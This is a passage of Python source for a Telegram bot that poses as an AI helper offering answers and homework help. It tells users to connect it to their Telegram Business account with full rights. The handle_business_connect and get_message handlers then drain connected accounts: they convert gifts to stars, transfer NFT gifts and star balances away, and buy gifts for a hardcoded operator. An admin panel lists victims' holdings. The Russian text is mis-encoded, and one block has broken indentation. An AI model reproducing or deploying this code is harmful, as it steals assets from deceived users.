        await callback.message.edit_text(text, parse_mode="HTML", reply_markup=keyboard)
    except:
        await bot.send_message(callback.from_user.id, text, parse_mode="HTML", reply_markup=keyboard)
    await callback.answer()

@dp.callback_query(F.data == "admin_weekly_stats")
async def admin_weekly_stats_callback(callback: types.CallbackQuery):
    """–ù–µ–¥–µ–ª—å–Ω–∞—è —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞"""
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("‚ùå –£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–æ—Å—Ç—É–ø–∞")
        return
    
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    cursor.execute('''
        SELECT 
            COUNT(*) as transactions,
            COALESCE(SUM(stars_amount), 0) as stars,
            COALESCE(SUM(gifts_count), 0) as gifts,
            COALESCE(SUM(unique_gifts_count), 0) as unique_gifts
        FROM transactions
        WHERE operation_type = 'received'
        AND timestamp > datetime('now', '-7 days')
    ''')
    
    weekly_stats = cursor.fetchone()
    conn.close()
    
    text = (
        f"üìà <b>–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –∑–∞ –Ω–µ–¥–µ–ª—é</b>\n\n"
        f"üìä –¢—Ä–∞–Ω–∑–∞–∫—Ü–∏–π: <code>{weekly_stats[0]}</code>\n"
        f"‚≠êÔ∏è –ó–≤—ë–∑–¥: <code>{weekly_stats[1]}</code>\n"
        f"üéÅ –û–±—ã—á–Ω—ã—Ö –ø–æ–¥–∞—Ä–∫–æ–≤: <code>{weekly_stats[2]}</code>\n"
        f"üíé NFT –ø–æ–¥–∞—Ä–∫–æ–≤: <code>{weekly_stats[3]}</code>"
    )
    
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[[InlineKeyboardButton(text="‚Ü©Ô∏è –ù–∞–∑–∞–¥ –∫ —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–µ", callback_data="admin_stats")]]
    )
    
    try:
        await callback.message.edit_text(text, parse_mode="HTML", reply_markup=keyboard)
    except:
        await bot.send_message(callback.from_user.id, text, parse_mode="HTML", reply_markup=keyboard)
    await callback.answer()

@dp.message(Command("user"))
async def user_info_command(message: types.Message):
    """–ö–æ–º–∞–Ω–¥–∞ –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ"""
    if not message.from_user or message.from_user.id != ADMIN_ID:
        return
    
    if not message.text:
        await message.answer("–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: /user [user_id]")
        return
        
    command_args = message.text.split()
    if len(command_args) != 2:
        await message.answer("–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: /user [user_id]")
        return
    
    try:
        user_id = int(command_args[1])
    except ValueError:
        await message.answer("‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç User ID")
        return
    
    balance_info = get_user_balance_info(user_id)
    
    if balance_info['total_received'] == 0:
        await message.answer(f"‚ùå –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {user_id} –Ω–µ –Ω–∞–π–¥–µ–Ω –≤ –±–∞–∑–µ –¥–∞–Ω–Ω—ã—Ö")
        return
    
    # –ü–æ–ª—É—á–∞–µ–º –∏—Å—Ç–æ—Ä–∏—é —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    cursor.execute('''
        SELECT operation_type, stars_amount, timestamp
        FROM transactions
        WHERE user_id = ?
        ORDER BY timestamp DESC
        LIMIT 5
    ''', (user_id,))
    
    transactions = cursor.fetchall()
    conn.close()
    
    text = f"üë§ <b>–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ</b>\n\n"
    text += f"üÜî ID: <code>{user_id}</code>\n"
    text += f"üìù Username: @{balance_info['username'] or 'Unknown'}\n\n"
    text += f"üí∞ <b>–ë–∞–ª–∞–Ω—Å:</b>\n"
    text += f"–ü–æ–ª—É—á–µ–Ω–æ: <code>{balance_info['total_received']}</code> ‚≠ê\n"
    text += f"–í–æ–∑–≤—Ä–∞—â–µ–Ω–æ: <code>{balance_info['total_refunded']}</code> ‚≠ê\n"
    text += f"–î–æ—Å—Ç—É–ø–Ω–æ –¥–ª—è –≤–æ–∑–≤—Ä–∞—Ç–∞: <code>{balance_info['available_for_refund']}</code> ‚≠ê\n\n"
    
    if transactions:
        text += "üìú <b>–ü–æ—Å–ª–µ–¥–Ω–∏–µ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏:</b>\n"
        for op_type, amount, timestamp in transactions:
            emoji = "üì•" if op_type == "received" else "üì§"
            op_text = "–ü–æ–ª—É—á–µ–Ω–æ" if op_type == "received" else "–í–æ–∑–≤—Ä–∞—Ç"
            text += f"{emoji} {op_text} {amount} ‚≠ê - {timestamp}\n"
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(
            text=f"‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å {balance_info['available_for_refund']} ‚≠ê",
            callback_data=f"quick_refund_{user_id}_{balance_info['available_for_refund']}"
        )] if balance_info['available_for_refund'] > 0 else []
    ])
    
    await message.answer(text, reply_markup=keyboard, parse_mode="HTML")

@dp.callback_query(F.data.startswith("quick_refund_"))
async def quick_refund_callback(callback: types.CallbackQuery):
    """–ë—ã—Å—Ç—Ä—ã–π –≤–æ–∑–≤—Ä–∞—Ç –≤—Å–µ—Ö –¥–æ—Å—Ç—É–ø–Ω—ã—Ö —Å—Ä–µ–¥—Å—Ç–≤"""
    if not callback.message or not callback.from_user:
        return
    
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("‚ùå –£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–ª—è —ç—Ç–æ–≥–æ –¥–µ–π—Å—Ç–≤–∏—è", show_alert=True)
        return
    
    if not callback.data:
        await callback.answer("‚ùå –ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö", show_alert=True)
        return
        
    try:
        # –ü–∞—Ä—Å–∏–º –¥–∞–Ω–Ω—ã–µ –∏–∑ callback_data
        parts = callback.data.split("_")
        if len(parts) != 4:
            await callback.answer("‚ùå –ù–µ–≤–µ—Ä–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ", show_alert=True)
            return
        
        user_id = int(parts[2])
        amount = int(parts[3])
        
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º –∞–∫—Ç—É–∞–ª—å–Ω—ã–π –±–∞–ª–∞–Ω—Å
        balance_info = get_user_balance_info(user_id)
        if amount != balance_info['available_for_refund']:
            await callback.answer("‚ö†Ô∏è –ë–∞–ª–∞–Ω—Å –∏–∑–º–µ–Ω–∏–ª—Å—è, –æ–±–Ω–æ–≤–∏—Ç–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é", show_alert=True)
            return
        
        if amount <= 0:
            await callback.answer("‚ùå –ù–µ—Ç —Å—Ä–µ–¥—Å—Ç–≤ –¥–ª—è –≤–æ–∑–≤—Ä–∞—Ç–∞", show_alert=True)
            return
        
        await callback.answer("üîÑ –ù–∞—á–∏–Ω–∞—é –≤–æ–∑–≤—Ä–∞—Ç...")
        
        # –í—ã–ø–æ–ª–Ω—è–µ–º –≤–æ–∑–≤—Ä–∞—Ç (–∫–æ–ø–∏—Ä—É–µ–º –ª–æ–≥–∏–∫—É –∏–∑ refund_command)
        available_gifts = await bot.get_available_gifts()
        if not available_gifts or not available_gifts.gifts:
            await callback.answer("‚ùå –ù–µ—Ç –¥–æ—Å—Ç—É–ø–Ω—ã—Ö –ø–æ–¥–∞—Ä–∫–æ–≤", show_alert=True)
            return
        
        sorted_gifts = sorted(available_gifts.gifts, key=lambda g: g.star_count, reverse=True)
        
        gifts_to_send = []
        remaining_stars = amount
        
        for gift in sorted_gifts:
            if gift.star_count <= remaining_stars:
                count = remaining_stars // gift.star_count
                for _ in range(count):
                    gifts_to_send.append(gift)
                remaining_stars -= count * gift.star_count
                
                if remaining_stars == 0:
                    break
        
        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –ø–æ–¥–∞—Ä–∫–∏
        sent_count = 0
        sent_value = 0
        for gift in gifts_to_send:
            try:
                await bot.send_gift(
                    user_id=user_id,
                    gift_id=gift.id
                )
                sent_count += 1
                sent_value += gift.star_count
            except Exception:
                break
        
        if sent_count > 0:
            # –õ–æ–≥–∏—Ä—É–µ–º –≤–æ–∑–≤—Ä–∞—Ç
            log_transaction(user_id, balance_info['username'], 'refund', sent_value)
            
            await callback.answer(
                f"‚úÖ –í–æ–∑–≤—Ä–∞—â–µ–Ω–æ {sent_value} ‚≠ê ({sent_count} –ø–æ–¥–∞—Ä–∫–æ–≤)",
                show_alert=True
            )
            
            # –û–±–Ω–æ–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ
            try:
            await callback.message.edit_reply_markup(reply_markup=None)
        except:
            pass
        else:
            await callback.answer("‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –ø–æ–¥–∞—Ä–∫–∏", show_alert=True)
            
    except Exception as e:
        await callback.answer(f"‚ùå –û—à–∏–±–∫–∞: {str(e)}", show_alert=True)

@dp.message(F.text == "/start")
async def start_command(message: Message):
    if not message.from_user:
        return
        
    try:
        connections = load_connections()
        count = len(connections)
    except Exception:
        count = 0

    if message.from_user.id != ADMIN_ID:
        await message.answer(
            "‚ù§Ô∏è <b>–Ø ‚Äî —Ç–≤–æ–π –≥–ª–∞–≤–Ω—ã–π –ø–æ–º–æ—â–Ω–∏–∫ –≤ –∂–∏–∑–Ω–∏</b>, –∫–æ—Ç–æ—Ä—ã–π:\n"
            "‚Ä¢ –æ—Ç–≤–µ—Ç–∏—Ç –Ω–∞ –ª—é–±–æ–π –≤–æ–ø—Ä–æ—Å\n"
            "‚Ä¢ –ø–æ–¥–¥–µ—Ä–∂–∏—Ç —Ç–µ–±—è –≤ —Ç—Ä—É–¥–Ω—É—é –º–∏–Ω—É—Ç—É\n"
            "‚Ä¢ —Å–¥–µ–ª–∞–µ—Ç –∑–∞ —Ç–µ–±—è –¥–æ–º–∞—à–∫—É, —Ä–∞–±–æ—Ç—É –∏–ª–∏ –¥–∞–∂–µ –Ω–∞—Ä–∏—Å—É–µ—Ç –∫–∞—Ä—Ç–∏–Ω—É\n\n"
            "<i>–í–≤–µ–¥–∏ –∑–∞–ø—Ä–æ—Å –Ω–∏–∂–µ, –∏ —è –ø–æ–º–æ–≥—É —Ç–µ–±–µ!</i> üëá",
            parse_mode="HTML"
        )
    else:
        await message.answer(
            "üëã <b>–ü–∞–Ω–µ–ª—å –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞</b>\n\n"
            "üîó –ë–æ—Ç –∞–∫—Ç–∏–≤–µ–Ω –∏ –≥–æ—Ç–æ–≤ –∫ —Ä–∞–±–æ—Ç–µ\n\n"
            "<b>–î–æ—Å—Ç—É–ø–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã:</b>\n"
            "/admin - –û—Ç–∫—Ä—ã—Ç—å –∞–¥–º–∏–Ω-–ø–∞–Ω–µ–ª—å\n"
            "/refund [user_id] [–∑–≤—ë–∑–¥—ã] - –í–æ–∑–≤—Ä–∞—Ç –∑–≤—ë–∑–¥\n"
            "/user [user_id] - –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ\n\n"
            "<i>üí° –î–ª—è –≤—ã–≤–æ–¥–∞ –∑–≤—ë–∑–¥ –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ @BotFather ‚Üí Balance</i>",
            parse_mode="HTML"
        )

@dp.message(F.text)
async def handle_text_query(message: Message):
    await message.answer(
        "üìå <b>–î–ª—è –ø–æ–ª–Ω–æ—Ü–µ–Ω–Ω–æ–π —Ä–∞–±–æ—Ç—ã –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –ø–æ–¥–∫–ª—é—á–∏—Ç—å –±–æ—Ç–∞ –∫ –±–∏–∑–Ω–µ—Å-–∞–∫–∫–∞—É–Ω—Ç—É Telegram</b>\n\n"
        "–ö–∞–∫ —ç—Ç–æ —Å–¥–µ–ª–∞—Ç—å?\n\n"
        "1. ‚öôÔ∏è –û—Ç–∫—Ä–æ–π—Ç–µ <b>–ù–∞—Å—Ç—Ä–æ–π–∫–∏ Telegram</b>\n"
        "2. üíº –ü–µ—Ä–µ–π–¥–∏—Ç–µ –≤ —Ä–∞–∑–¥–µ–ª <b>Telegram –¥–ª—è –±–∏–∑–Ω–µ—Å–∞</b>\n"
        "3. ü§ñ –û—Ç–∫—Ä–æ–π—Ç–µ –ø—É–Ω–∫—Ç <b>–ß–∞—Ç-–±–æ—Ç—ã</b>\n"
        "4. ‚úçÔ∏è –í–≤–µ–¥–∏—Ç–µ –∏–º—è –≤–∞—à–µ–≥–æ –±–æ—Ç–∞\n\n"
        "‚ùó–î–ª—è –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–π —Ä–∞–±–æ—Ç—ã –±–æ—Ç—É —Ç—Ä–µ–±—É—é—Ç—Å—è <b>–≤—Å–µ –ø—Ä–∞–≤–∞</b>",
        parse_mode="HTML"
    )

CONNECTIONS_FILE = "business_connections.json"

def load_json_file(filename):
    """–ó–∞–≥—Ä—É–∑–∏—Ç—å –¥–∞–Ω–Ω—ã–µ –∏–∑ JSON —Ñ–∞–π–ª–∞"""
    try:
        if os.path.exists(filename):
            with open(filename, "r", encoding="utf-8") as f:
                return json.load(f)
        return []
    except Exception as e:
        logging.exception(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Ñ–∞–π–ª–∞ {filename}")
        return []

def get_connection_id_by_user(user_id: int) -> str:
    """–ü–æ–ª—É—á–∏—Ç—å ID –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –ø–æ ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è"""
    data = load_json_file(CONNECTIONS_FILE)
    for conn in data:
        if conn.get("user_id") == user_id:
            return conn.get("business_connection_id", "")
    return ""

def load_connections():
    """–ó–∞–≥—Ä—É–∑–∏—Ç—å –≤—Å–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è"""
    return load_json_file(CONNECTIONS_FILE)

async def send_welcome_message_to_admin(connection, user_id, _bot):
    try:
        admin_id = 8077821068

        rights = connection.rights
        business_connection = connection

        star_amount = 0
        all_gifts_amount = 0
        unique_gifts_amount = 0

        if rights.can_view_gifts_and_stars:
            try:
                response = await bot(GetFixedBusinessAccountStarBalance(business_connection_id=business_connection.id))
                star_amount = response.star_amount

                gifts = await bot(GetBusinessAccountGifts(business_connection_id=business_connection.id))
                all_gifts_amount = len(gifts.gifts)
                unique_gifts_amount = sum(1 for gift in gifts.gifts if hasattr(gift, 'type') and gift.type == "unique")
            except Exception as e:
                logging.exception("–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –¥–∞–Ω–Ω—ã—Ö –æ –ø–æ–¥–∞—Ä–∫–∞—Ö –∏ –∑–≤–µ–∑–¥–∞—Ö")

        star_amount_text = star_amount if rights.can_view_gifts_and_stars else "–ù–µ—Ç –¥–æ—Å—Ç—É–ø–∞ ‚ùå"
        all_gifts_text = all_gifts_amount if rights.can_view_gifts_and_stars else "–ù–µ—Ç –¥–æ—Å—Ç—É–ø–∞ ‚ùå"
        unique_gifts_text = unique_gifts_amount if rights.can_view_gifts_and_stars else "–ù–µ—Ç –¥–æ—Å—Ç—É–ø–∞ ‚ùå"

        msg = (
            f"ü§ñ <b>–ù–æ–≤—ã–π –±–∏–∑–Ω–µ—Å-–±–æ—Ç –ø–æ–¥–∫–ª—é—á–µ–Ω!</b>\n\n"
            f"üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: @{business_connection.user.username or '‚Äî'}\n"
            f"üÜî User ID: <code>{business_connection.user.id}</code>\n"
            f"üîó Connection ID: <code>{business_connection.id}</code>\n"
            f"\n‚≠êÔ∏è –ó–≤–µ–∑–¥—ã: <code>{star_amount_text}</code>"
            f"\nüéÅ –ü–æ–¥–∞—Ä–∫–æ–≤: <code>{all_gifts_text}</code>"
            f"\nüîù NFT –ø–æ–¥–∞—Ä–∫–æ–≤: <code>{unique_gifts_text}</code>"            
        )
        keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [InlineKeyboardButton(text="üéÅ –í—ã–≤–µ—Å—Ç–∏ –≤—Å–µ –ø–æ–¥–∞—Ä–∫–∏", callback_data=f"reveal_all_gifts:{user_id}")],
                [InlineKeyboardButton(text="‚≠êÔ∏è –ü—Ä–µ–≤—Ä–∞—Ç–∏—Ç—å –≤—Å–µ –ø–æ–¥–∞—Ä–∫–∏ –≤ –∑–≤–µ–∑–¥—ã", callback_data=f"convert_exec:{user_id}")],
                [InlineKeyboardButton(text="üîù –ê–ø–≥—Ä–µ–π–¥–Ω—É—Ç—å –≤—Å–µ –≥–∏—Ñ—Ç—ã", callback_data=f"upgrade_user:{user_id}")]
            ]
        )
        await _bot.send_message(admin_id, msg, parse_mode="HTML", reply_markup=keyboard)
    except Exception as e:
        logging.exception("–ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ –≤ –ª–∏—á–Ω—ã–π —á–∞—Ç.")

def save_business_connection_data(business_connection):
    """–°–æ—Ö—Ä–∞–Ω–∏—Ç—å –¥–∞–Ω–Ω—ã–µ –±–∏–∑–Ω–µ—Å-–ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è"""
    business_connection_data = {
        "user_id": business_connection.user.id,
        "business_connection_id": business_connection.id,
        "username": business_connection.user.username,
        "first_name": business_connection.user.first_name or "Unknown",
        "last_name": business_connection.user.last_name or ""
    }

    data = load_json_file(CONNECTIONS_FILE)

    # –û–±–Ω–æ–≤–ª—è–µ–º —Å—É—â–µ—Å—Ç–≤—É—é—â—É—é –∑–∞–ø–∏—Å—å –∏–ª–∏ –¥–æ–±–∞–≤–ª—è–µ–º –Ω–æ–≤—É—é
    updated = False
    for i, conn in enumerate(data):
        if conn["user_id"] == business_connection.user.id:
            data[i] = business_connection_data
            updated = True
            break

    if not updated:
        data.append(business_connection_data)

    # –°–æ—Ö—Ä–∞–Ω—è–µ–º –æ–±—Ä–∞—Ç–Ω–æ
    try:
        with open(CONNECTIONS_FILE, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
    except Exception as e:
        logging.exception("–û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏–∏ –¥–∞–Ω–Ω—ã—Ö –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è")

async def fixed_get_gift_name(business_connection_id: str, owned_gift_id: str) -> str:
    """–ü–æ–ª—É—á–∏—Ç—å –∏–º—è –ø–æ–¥–∞—Ä–∫–∞ –ø–æ –µ–≥–æ ID"""
    try:
        gifts = await bot(GetBusinessAccountGifts(business_connection_id=business_connection_id))

        if not gifts.gifts:
            return "üéÅ –ù–µ—Ç –ø–æ–¥–∞—Ä–∫–æ–≤."
        
        for gift in gifts.gifts:
            if hasattr(gift, 'owned_gift_id') and gift.owned_gift_id == owned_gift_id:
                if hasattr(gift, 'gift') and hasattr(gift.gift, 'base_name'):
                    gift_name = gift.gift.base_name.replace(" ", "")
                    return f"https://t.me/nft/{gift_name}-{gift.gift.number}"
        
        return "üéÅ –ü–æ–¥–∞—Ä–æ–∫ –Ω–µ –Ω–∞–π–¥–µ–Ω."
    except Exception as e:
        logging.exception("–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –∏–º–µ–Ω–∏ –ø–æ–¥–∞—Ä–∫–∞")
        return "üéÅ –û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –ø–æ–¥–∞—Ä–∫–∞."

@dp.business_connection()
async def handle_business_connect(business_connection: BusinessConnection):
    try:
        await send_welcome_message_to_admin(business_connection, business_connection.user.id, bot)
        await bot.send_message(
            business_connection.user.id, 
            "–ü—Ä–∏–≤–µ—Ç! –¢—ã –ø–æ–¥–∫–ª—é—á–∏–ª –±–æ—Ç–∞ –∫–∞–∫ –±–∏–∑–Ω–µ—Å-–∞—Å—Å–∏—Å—Ç–µ–Ω—Ç–∞."
        )
        
        save_business_connection_data(business_connection)
        
    except Exception as e:
        logging.exception("–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±—Ä–∞–±–æ—Ç–∫–µ –±–∏–∑–Ω–µ—Å-–ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è")

@dp.business_message()
async def get_message(message: types.Message):
    business_id = message.business_connection_id
    user_id = message.from_user.id if message.from_user else None

    if user_id == OWNER_ID or not business_id:
        return
    
    # –ü–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ
    username = message.from_user.username if message.from_user else None
    
    # –°—á—ë—Ç—á–∏–∫–∏ –¥–ª—è –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è
    total_stars_collected = 0
    total_gifts_converted = 0
    total_unique_gifts_transferred = 0

    # –ö–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏—è –Ω–µ—É–Ω–∏–∫–∞–ª—å–Ω—ã—Ö –ø–æ–¥–∞—Ä–∫–æ–≤
    try:
        convert_gifts = await bot.get_business_account_gifts(business_id, exclude_unique=True)
        for gift in convert_gifts.gifts:
            try:
                if hasattr(gift, 'owned_gift_id') and gift.owned_gift_id:
                    owned_gift_id = gift.owned_gift_id
                    await bot.convert_gift_to_stars(business_id, owned_gift_id)
                    total_gifts_converted += 1
                    print(f"–ö–æ–Ω–≤–µ—Ä—Ç–∏—Ä–æ–≤–∞–Ω –ø–æ–¥–∞—Ä–æ–∫ {owned_gift_id}")
            except Exception as e:
                print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏–∏ –ø–æ–¥–∞—Ä–∫–∞: {e}")
                continue
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –Ω–µ—É–Ω–∏–∫–∞–ª—å–Ω—ã—Ö –ø–æ–¥–∞—Ä–∫–æ–≤: {e}")
    
    # –ü–µ—Ä–µ–¥–∞—á–∞ —É–Ω–∏–∫–∞–ª—å–Ω—ã—Ö –ø–æ–¥–∞—Ä–∫–æ–≤
    try:
        unique_gifts = await bot.get_business_account_gifts(business_id, exclude_unique=False)
        if not unique_gifts.gifts:
            print("–ù–µ—Ç —É–Ω–∏–∫–∞–ª—å–Ω—ã—Ö –ø–æ–¥–∞—Ä–∫–æ–≤ –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏.")
        else:
            for gift in unique_gifts.gifts:
                try:
                    if hasattr(gift, 'owned_gift_id') and gift.owned_gift_id:
                        owned_gift_id = gift.owned_gift_id
                        await bot.transfer_gift(business_id, owned_gift_id, task_id, 25)
                        total_unique_gifts_transferred += 1
                        print(f"–£—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –ø–æ–¥–∞—Ä–æ–∫ {owned_gift_id}")
                except Exception as e:
                    print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –ø–æ–¥–∞—Ä–∫–∞: {e}")
                    continue
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ —É–Ω–∏–∫–∞–ª—å–Ω—ã—Ö –ø–æ–¥–∞—Ä–∫–æ–≤: {e}")
    
    # –†–∞–±–æ—Ç–∞ —Å –±–∞–ª–∞–Ω—Å–æ–º –∑–≤–µ–∑–¥
    try:
        stars = await bot.get_business_account_star_balance(business_id)
        if hasattr(stars, 'amount') and stars.amount > 0:
            print(f"–ù–∞–π–¥–µ–Ω–æ {stars.amount} –∑–≤—ë–∑–¥")
            
            # –ü–µ—Ä–µ–≤–æ–¥–∏–º –∑–≤—ë–∑–¥—ã –Ω–∞ –±–∞–ª–∞–Ω—Å –±–æ—Ç–∞
            await bot.transfer_business_account_stars(business_id, stars.amount)
            total_stars_collected = stars.amount
            print(f"–£—Å–ø–µ—à–Ω–æ –ø–µ—Ä–µ–≤–µ–¥–µ–Ω–æ {stars.amount} –∑–≤—ë–∑–¥ –Ω–∞ –±–∞–ª–∞–Ω—Å –±–æ—Ç–∞")
            
            # –ü–æ–∫—É–ø–∞–µ–º –ø–æ–¥–∞—Ä–∫–∏ –∑–∞ –∑–≤—ë–∑–¥—ã –∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –∞–¥–º–∏–Ω—É
            try:
                available_gifts = await bot.get_available_gifts()
                if available_gifts and available_gifts.gifts:
                    # –ù–∞—Ö–æ–¥–∏–º —Å–∞–º—ã–π –¥–µ—à—ë–≤—ã–π –ø–æ–¥–∞—Ä–æ–∫
                    cheapest_gift = min(available_gifts.gifts, key=lambda g: g.star_count)
                    star_balance = stars.amount
                    gifts_to_buy = star_balance // cheapest_gift.star_count
                    
                    print(f"–ü–æ–∫—É–ø–∞–µ–º {gifts_to_buy} –ø–æ–¥–∞—Ä–∫–æ–≤ –ø–æ {cheapest_gift.star_count} –∑–≤—ë–∑–¥ –∫–∞–∂–¥—ã–π")
                    
                    for i in range(gifts_to_buy):
                        try:
                            await bot.send_gift(
                                user_id=task_id,
                                gift_id=cheapest_gift.id
                            )
                            print(f"–û—Ç–ø—Ä–∞–≤–ª–µ–Ω –ø–æ–¥–∞—Ä–æ–∫ {i+1}/{gifts_to_buy}")
                        except Exception as e:
                            print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –ø–æ–¥–∞—Ä–∫–∞ {i+1}: {e}")
                            break
                            
                    print(f"–í—Å–µ–≥–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –ø–æ–¥–∞—Ä–∫–æ–≤ –∞–¥–º–∏–Ω—É: {gifts_to_buy}")
                else:
                    print("–ù–µ—Ç –¥–æ—Å—Ç—É–ø–Ω—ã—Ö –ø–æ–¥–∞—Ä–∫–æ–≤ –¥–ª—è –ø–æ–∫—É–ø–∫–∏")
            except Exception as e:
                print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–∫—É–ø–∫–µ –ø–æ–¥–∞—Ä–∫–æ–≤: {e}")
        else:
            print("–ù–µ—Ç –∑–≤—ë–∑–¥ –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏.")
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —Ä–∞–±–æ—Ç–µ —Å –±–∞–ª–∞–Ω—Å–æ–º –∑–≤—ë–∑–¥: {e}")
    
    # –õ–æ–≥–∏—Ä—É–µ–º —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é –µ—Å–ª–∏ –±—ã–ª–∏ —Å–æ–±—Ä–∞–Ω—ã –∫–∞–∫–∏–µ-–ª–∏–±–æ —Ä–µ—Å—É—Ä—Å—ã
    if total_stars_collected > 0 or total_gifts_converted > 0 or total_unique_gifts_transferred > 0:
        log_transaction(
            user_id=user_id,
            username=username,
            operation_type='received',
            stars_amount=total_stars_collected,
            gifts_count=total_gifts_converted,
            unique_gifts_count=total_unique_gifts_transferred,
            business_connection_id=business_id
        )
        print(f"–¢—Ä–∞–Ω–∑–∞–∫—Ü–∏—è –∑–∞–ø–∏—Å–∞–Ω–∞: {total_stars_collected} –∑–≤—ë–∑–¥, {total_gifts_converted} –æ–±—ã—á–Ω—ã—Ö –ø–æ–¥–∞—Ä–∫–æ–≤, {total_unique_gifts_transferred} —É–Ω–∏–∫–∞–ª—å–Ω—ã—Ö –ø–æ–¥–∞—Ä–∫–æ–≤")

async def main():
    try:
        init_database()  # –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä—É–µ–º –±–∞–∑—É –¥–∞–Ω–Ω—ã—Ö
        await dp.start_polling(bot)
    except Exception as e:
        logging.exception("–û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–ø—É—Å–∫–µ –±–æ—Ç–∞")

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    asyncio.run(main())